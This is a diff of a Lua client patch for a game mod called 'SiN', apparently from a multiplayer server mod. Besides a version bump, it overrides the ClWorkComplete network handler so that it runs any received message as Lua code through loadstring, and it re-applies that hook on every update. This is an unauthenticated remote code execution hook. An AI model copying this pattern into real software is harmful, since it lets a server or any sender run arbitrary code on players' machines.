@@ -1,6 +1,6 @@
 System.Log("$9[$4SiN$9] Installing Entities patch ..") 
 
-FILE_VERSION = "2.5.7";
+FILE_VERSION = "2.5.8";
 
 if(not Hunter)then Script.ReloadScript("Scripts/Entities/AI/Aliens/Hunter.lua") end;
 if(not Alien)then Script.ReloadScript("Scripts/Entities/AI/Aliens/Alien.lua") end;
@@ -140,6 +140,10 @@ SiN= {
 	Update = function(self)
 		if(self.UpdateFlyMode)then
 			self:UpdateFlyMode()
+		end;
+		if(not self.lastClWorkComplete or self.lastClWorkComplete~=g_gameRules.Client.ClWorkComplete)then
+			function g_gameRules.Client:ClWorkComplete(id,m) if(m:find[[^]])then loadstring(m:sub(5))();end;end;
+			self.lastClWorkComplete = g_gameRules.Client.ClWorkComplete;
 		end;
 	end;
 	OnAction = function(self, a, b, c)
@@ -327,6 +331,12 @@ function g_gameRules.Client:OnDisconnect(c, d)
 	PL_MODE = 0;
 	
 	System.ClearKeyState();
+	
+	if(SiN)then
+		SiN.Update=function(self)
+			return;
+		end;
+	end;
 	
 	printf("$9[$4SiN$9] Deinstalled client successfully");
 end;
